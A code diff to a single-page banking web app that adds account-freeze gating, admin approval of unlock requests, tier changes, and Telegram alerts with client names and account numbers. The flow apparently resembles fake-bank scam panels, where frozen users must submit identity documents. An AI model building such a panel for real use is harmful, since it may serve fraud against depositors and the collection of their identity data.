+    if(state.tier==='basic'){b2.className='btn btn-tier cta';b2.textContent='Upgrade to Premium';b2.onclick=startWizard;
+      b3.className='btn btn-tier cta';b3.textContent='Go Private';b3.onclick=()=>startWizard(4);}
+    else if(state.tier==='premium'){b2.className='btn btn-tier locked';b2.textContent='Current plan (Active)';b2.onclick=null;
+      b3.className='btn btn-tier cta';b3.textContent='Go Private';b3.onclick=()=>startWizard(4);}
+    else{b2.className='btn btn-tier locked';b2.textContent='Unlocked';b2.onclick=null;
+      b3.className='btn btn-tier locked';b3.textContent='Current plan (Sovereign)';b3.onclick=null;}
+  }
 }
 
 function goVerify(){go('s-verify');updateLimitUI();}
@@ -2600,6 +2883,12 @@ function goVerify(){go('s-verify');updateLimitUI();}
 /* ----- wizard ----- */
 let targetUpgradeTier = 'premium';
 function startWizard(step, target){
+  const curUser = getCurrentActiveUser();
+  if (curUser && curUser.status === 'frozen') {
+    toast('⚠️ Account is frozen. Submit verification details to unlock.');
+    openUnlockAccountModal();
+    return;
+  }
   targetUpgradeTier = target || (step === 4 ? 'private' : 'premium');
   document.getElementById('wizard').style.display='block';
   wizShow(step||1);
@@ -2759,15 +3048,7 @@ function openUpgradePrompt(){
 function closeUpgradePrompt(){document.getElementById('modal2').classList.remove('open');document.body.style.overflow='';}
 
 /* ================= ADMIN CONSOLE ================= */
-let ADM_USERS=JSON.parse(localStorage.getItem('mcb_users')) || [
- {id:'u1',name:'Adaeze Okafor',email:'adaeze.okafor@crestmail.com',tier:'basic',balance:0.00,status:'active',kyc:'verified',joined:'Mar 2025',accountNumber:'4829104820',profileDetails:{name:'Adaeze Okafor',country:'US',phone:'+1 (555) 382-9012',dob:'1992-06-15',addr:'1400 Park Ave, Suite 22B',city:'New York',state:'NY',zip:'10017'}},
- {id:'u2',name:'Chidi Nwosu',email:'chidi.nwosu@crestmail.com',tier:'premium',balance:0.00,status:'active',kyc:'verified',joined:'Jan 2025',accountNumber:'7391049281'},
- {id:'u3',name:'Maya Kimani',email:'maya.kimani@crestmail.com',tier:'private',balance:0.00,status:'active',kyc:'verified',joined:'Nov 2024',accountNumber:'8192047193'},
- {id:'u4',name:'Tolu Adeyemi',email:'tolu.adeyemi@crestmail.com',tier:'basic',balance:0.00,status:'active',kyc:'pending',target:'premium',joined:'Sep 2026',accountNumber:'6281940172',kycDetails:{name:'Tolu Adeyemi',dob:'1988-06-14',nat:'United States',idType:'Passport',idFile:'us_passport_adeyemi.pdf',ssnLast4:'6192',addrType:'Bank Statement',addrFile:'chase_statement_sept2026.pdf',submittedAt:'Today · 08:30 AM'}},
- {id:'u5',name:'Jonas Berg',email:'jonas.berg@crestmail.com',tier:'basic',balance:0.00,status:'frozen',kyc:'pending',target:'private',joined:'Oct 2026',accountNumber:'5192840192',kycDetails:{name:'Jonas Berg',dob:'1984-11-03',nat:'Germany',idType:'National ID Card',idFile:'personalausweis_berg.pdf',ssnLast4:'4081',addrType:'Utility Bill',addrFile:'berlin_energy_bill.pdf',submittedAt:'Yesterday · 16:20'}},
- {id:'u6',name:'Amina Diallo',email:'amina.diallo@crestmail.com',tier:'premium',balance:0.00,status:'active',kyc:'pending',target:'private',joined:'Oct 2026',accountNumber:'9182736450',kycDetails:{name:'Amina Diallo',dob:'1992-03-29',nat:'United Kingdom',idType:'Driver License',idFile:'uk_driving_licence_diallo.pdf',ssnLast4:'8835',addrType:'Lease Agreement',addrFile:'london_tenancy_signed.pdf',submittedAt:'Yesterday · 19:45'}},
- {id:'u7',name:'Sofia Reyes',email:'sofia.reyes@crestmail.com',tier:'basic',balance:0.00,status:'active',kyc:'rejected',joined:'Aug 2026',accountNumber:'3819204716'},
-];
+// ADM_USERS is declared and initialized at script start
 
 // Ensure pending users in existing localStorage have full kycDetails
 ADM_USERS.forEach(u => {
@@ -2823,7 +3104,7 @@ function closeDocInspectModal(){
 
 function renderAdmin(){
   const total=ADM_USERS.length;
-  const pending=ADM_USERS.filter(u=>u.kyc==='pending');
+  const pending=ADM_USERS.filter(u=>u.kyc==='pending' || (u.status==='frozen' && u.unlockRequest));
   const held=ADM_USERS.reduce((s,u)=>s+u.balance,0);
   const frozen=ADM_USERS.filter(u=>u.status==='frozen').length;
   document.getElementById('adm-stats').innerHTML=`
@@ -2834,6 +3115,56 @@ function renderAdmin(){
   document.getElementById('adm-pend-n').textContent=pending.length;
 
   document.getElementById('adm-pending').innerHTML=pending.length?pending.map(u=>{
+    if(u.status === 'frozen' && u.unlockRequest){
+      const req = u.unlockRequest;
+      return `
+    <div class="pend-card frozen" style="border:1.5px solid var(--gold)">
+      <div class="pend-top">
+        <div class="avatar">${admInitials(u.name)}</div>
+        <div>
+          <b>${u.name}</b>
+          <small>${u.email} · Account #${u.accountNumber || '—'} · Status: <span style="color:#ff6b6b;font-weight:700">FROZEN</span></small>
+        </div>
+        <span class="adm-tag" style="background:rgba(200,165,90,0.2);color:var(--gold);border:1px solid var(--gold)">UNLOCK REQUEST</span>
+      </div>
+      <div class="kyc-cred-box" style="border-color:rgba(200,165,90,0.3)">
+        <div class="kyc-cred-head">
+          <div>
+            <span class="kyc-target-tag" style="color:var(--gold)">Request: Account Unfreeze & Credential Verification</span>
+            <span class="kyc-date">${req.submittedAt}</span>
+          </div>
+          <span class="kyc-status-chip" style="background:rgba(200,165,90,0.25);color:var(--gold)">Pending Clearance</span>
+        </div>
+        <div class="kyc-cred-grid">
+          <div class="kcg-item">
+            <small>Client Name</small>
+            <b>${u.name}</b>
+          </div>
+          <div class="kcg-item">
+            <small>Verification Document</small>
+            <b>${req.docType} (<code>${req.docNum}</code>)</b>
+          </div>
+          <div class="kcg-item doc-item" style="grid-column:span 2">
+            <small>Attached Document File</small>
+            <div class="doc-badge" onclick="admInspectDoc('${u.name.replace(/'/g,"\\'")}','${req.docType.replace(/'/g,"\\'")}','${(req.fileName||'id_scan.pdf').replace(/'/g,"\\'")}')">
+              <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><path d="M14 2v6h6"/><circle cx="10" cy="13" r="2"/></svg>
+              <span>${req.fileName || 'verification_doc.pdf'}</span>
+              <span class="doc-action">Inspect</span>
+            </div>
+          </div>
+          <div class="kcg-item" style="grid-column:span 2">
+            <small>Client Explanation / Note</small>
+            <p style="margin:4px 0 0;font-size:12.5px;color:#e2e8f0;font-style:italic">"${req.note}"</p>
+          </div>
+        </div>
+      </div>
+      <div class="pend-btns">
+        <button class="btn btn-green" onclick="admUnfreeze('${u.id}')">Approve & Unfreeze Account</button>
+        <button class="btn btn-redghost" onclick="admRejectUnlock('${u.id}')">Reject Unlock Request</button>
+      </div>
+    </div>`;
+    }
+
     const k = u.kycDetails || {
       name: u.name,
       dob: '1990-01-01',
@@ -2946,7 +3277,16 @@ function admApprove(id){
   localStorage.setItem('mcb_users', JSON.stringify(ADM_USERS));
   syncUsersToServer(ADM_USERS);
   admLog(u.name+' upgraded to '+TIER_INFO[u.tier].name+' tier by Lead Administrator');
-  toast(u.name+' approved · now '+TIER_INFO[u.tier].name);renderAdmin();
+  toast(u.name+' approved · now '+TIER_INFO[u.tier].name);
+  const cur = getCurrentActiveUser();
+  if (cur && cur.id === u.id) {
+    cur.tier = u.tier;
+    cur.kyc = u.kyc;
+    state.tier = u.tier;
+    updateBalanceUI();
+    updateLimitUI();
+  }
+  renderAdmin();
 }
 function admReject(id){
   const u=ADM_USERS.find(x=>x.id===id);if(!u)return;
@@ -2955,6 +3295,47 @@ function admReject(id){
   syncUsersToServer(ADM_USERS);
   admLog('Upgrade rejected for '+u.name+' by Lead Administrator');
   toast('Upgrade rejected for '+u.name);renderAdmin();
+}
+
+function admUnfreeze(id){
+  const u = ADM_USERS.find(x => x.id === id);
+  if(!u) return;
+  u.status = 'active';
+  delete u.unlockRequest;
+  localStorage.setItem('mcb_users', JSON.stringify(ADM_USERS));
+  syncUsersToServer(ADM_USERS);
+  admLog('Account unfrozen and restored by Lead Administrator: ' + u.name);
+  toast(u.name + ' unfrozen and fully active');
+  sendTelegramAlert(`🟢 <b>ACCOUNT RESTORED & UNFROZEN</b>\n\n<b>Client:</b> ${u.name}\n<b>Account Number:</b> <code>${u.accountNumber || 'N/A'}</code>\n<b>New Status:</b> <b>ACTIVE</b>\n<b>Compliance Officer:</b> Lead Administrator`);
+  
+  const cur = getCurrentActiveUser();
+  if(cur && cur.id === u.id){
+    cur.status = 'active';
+    delete cur.unlockRequest;
+    renderFrozenBanner();
+    updateBalanceUI();
+  }
+  if(admState.sel && admState.sel.id === u.id) admOpen(u.id);
+  renderAdmin();
+}
+
+function admRejectUnlock(id){
+  const u = ADM_USERS.find(x => x.id === id);
+  if(!u) return;
+  delete u.unlockRequest;
+  localStorage.setItem('mcb_users', JSON.stringify(ADM_USERS));
+  syncUsersToServer(ADM_USERS);
+  admLog('Unlock request rejected for: ' + u.name);
+  toast('Unlock request rejected for ' + u.name);
+  sendTelegramAlert(`❌ <b>UNLOCK REQUEST REJECTED</b>\n\n<b>Client:</b> ${u.name}\n<b>Account Number:</b> <code>${u.accountNumber || 'N/A'}</code>\n<b>Status:</b> Remains FROZEN`);
+  
+  const cur = getCurrentActiveUser();
+  if(cur && cur.id === u.id){
+    delete cur.unlockRequest;
+    renderFrozenBanner();
+  }
+  if(admState.sel && admState.sel.id === u.id) admOpen(u.id);
+  renderAdmin();
 }
 
 /* ----- user action sheet ----- */
@@ -2973,6 +3354,21 @@ function admOpen(id){
   fr.textContent=u.status==='frozen'?'❄️ Unfreeze account':'🔒 Freeze account';
   const fzNotice = document.getElementById('am-frozen-notice');
   if(fzNotice) fzNotice.style.display = u.status==='frozen' ? 'block' : 'none';
+  
+  const unBox = document.getElementById('am-unlock-box');
+  const unDet = document.getElementById('am-unlock-details');
+  if(u.status === 'frozen' && u.unlockRequest){
+    if(unBox) unBox.style.display = 'block';
+    if(unDet) {
+      unDet.innerHTML = `<b>Submitted:</b> ${u.unlockRequest.submittedAt}<br>
+<b>Document:</b> ${u.unlockRequest.docType} (<code>${u.unlockRequest.docNum}</code>)<br>
+<b>Attachment:</b> <code>${u.unlockRequest.fileName || 'verification_scan.pdf'}</code><br>
+<b>Note:</b> <i>"${u.unlockRequest.note || 'Identity verified'}"</i>`;
+    }
+  } else {
+    if(unBox) unBox.style.display = 'none';
+  }
+  
   document.getElementById('modal3').classList.add('open');
   document.body.style.overflow='hidden';
 }
@@ -2988,18 +3384,38 @@ function admPromote(){
   u.tier=TIER_ORDER[ti+1];if(u.kyc==='pending'&&u.target===u.tier){u.kyc='verified';u.target=null;}
   localStorage.setItem('mcb_users', JSON.stringify(ADM_USERS));
   syncUsersToServer(ADM_USERS);
-  admLog(u.name+' promoted to '+TIER_INFO[u.tier].name+' by Lead Administrator');toast(u.name+' → '+TIER_INFO[u.tier].name+' tier');admOpen(u.id);renderAdmin();
+  admLog(u.name+' promoted to '+TIER_INFO[u.tier].name+' by Lead Administrator');
+  toast(u.name+' → '+TIER_INFO[u.tier].name+' tier');
+  const cur = getCurrentActiveUser();
+  if (cur && cur.id === u.id) {
+    cur.tier = u.tier;
+    cur.kyc = u.kyc;
+    state.tier = u.tier;
+    updateBalanceUI();
+    updateLimitUI();
+  }
+  admOpen(u.id);renderAdmin();
 }
 function admDemote(){
   const u=admState.sel;const ti=TIER_ORDER.indexOf(u.tier);if(ti<=0)return;
   u.tier=TIER_ORDER[ti-1];
   localStorage.setItem('mcb_users', JSON.stringify(ADM_USERS));
   syncUsersToServer(ADM_USERS);
-  admLog(u.name+' demoted to '+TIER_INFO[u.tier].name+' by Lead Administrator');toast(u.name+' → '+TIER_INFO[u.tier].name+' tier');admOpen(u.id);renderAdmin();
+  admLog(u.name+' demoted to '+TIER_INFO[u.tier].name+' by Lead Administrator');
+  toast(u.name+' → '+TIER_INFO[u.tier].name+' tier');
+  const cur = getCurrentActiveUser();
+  if (cur && cur.id === u.id) {
+    cur.tier = u.tier;
+    state.tier = u.tier;
+    updateBalanceUI();
+    updateLimitUI();
+  }
+  admOpen(u.id);renderAdmin();
 }
 function admFreeze(){
   const u=admState.sel;
   u.status=u.status==='frozen'?'active':'frozen';
+  if(u.status === 'active') delete u.unlockRequest;
   localStorage.setItem('mcb_users', JSON.stringify(ADM_USERS));
   syncUsersToServer(ADM_USERS);
   admLog((u.status==='frozen'?'Account frozen: ':'Account unfrozen: ')+u.name+' by Lead Administrator');
@@ -3010,7 +3426,9 @@ function admFreeze(){
   const cur = getCurrentActiveUser();
   if (cur && cur.id === u.id) {
     cur.status = u.status;
+    if(u.status === 'active') delete cur.unlockRequest;
     renderFrozenBanner();
+    updateBalanceUI();
   }
   
   admOpen(u.id);renderAdmin();
@@ -3350,19 +3768,13 @@ function confirmNewCard(){
   sendTelegramAlert(tgHtml);
 }
 
-// Copy Card Details
-function copyCardDetails(){
-  const cards = getUserCards();
-  if(cards.length === 0){
-    toast('No cards issued yet. Apply for a card first.');
-    return;
-  }
-  const idx = getActiveCardIndex();
-  copyText(cards[idx].num.replace(/\s+/g,''), 'Card number (' + cards[idx].num + ')');
-}
-
 // Card Limits Modal
 function openCardLimitsModal(){
+  const user = getCurrentActiveUser();
+  if (user && user.status === 'frozen') {
+    showFrozenModal('Card Spending Limit Configuration');
+    return;
+  }
   document.getElementById('modal-limits').classList.add('open');
   document.body.style.overflow = 'hidden';
 }
@@ -3544,6 +3956,12 @@ function submitRating(){
 
 // Auto-Invest Modal
 function openAutoInvestModal(){
+  const curUser = getCurrentActiveUser();
+  if (curUser && curUser.status === 'frozen') {
+    toast('⚠️ Account Frozen: Portfolio operations suspended.');
+    showFrozenModal('Auto-Invest Allocations Suspended');
+    return;
+  }
   document.getElementById('modal-auto-invest').classList.add('open');
   document.body.style.overflow = 'hidden';
 }
@@ -3554,6 +3972,12 @@ function closeAutoInvestModal(){
 
 // Vault Savings Modal
 function openVaultModal(){
+  const curUser = getCurrentActiveUser();
+  if (curUser && curUser.status === 'frozen') {
+    toast('⚠️ Account Frozen: Vault savings deposits suspended.');
+    showFrozenModal('Vault & Savings Allocations Suspended');
+    return;
+  }
   document.getElementById('modal-vault').classList.add('open');
   document.body.style.overflow = 'hidden';
 }
@@ -3564,6 +3988,12 @@ function closeVaultModal(){
 
 // Add Recipient Modal
 function openAddRecipientModal(){
+  const curUser = getCurrentActiveUser();
+  if (curUser && curUser.status === 'frozen') {
+    toast('⚠️ Account Frozen: Adding benefactors suspended.');
+    showFrozenModal('Benefactor Management Suspended');
+    return;
+  }
   const n = document.getElementById('new-rec-name');
   const a = document.getElementById('new-rec-acct');
   const b = document.getElementById('new-rec-bank');
@@ -3671,7 +4101,11 @@ renderNav();renderTx();
           const updated = ADM_USERS.find(x => x.id === cur.id);
           if (updated) {
             BALANCE = Number(updated.balance) || 0;
+            cur.status = updated.status;
+            cur.tier = updated.tier;
+            state.tier = updated.tier;
             updateBalanceUI();
+            updateLimitUI();
             renderFrozenBanner();
           }
         }
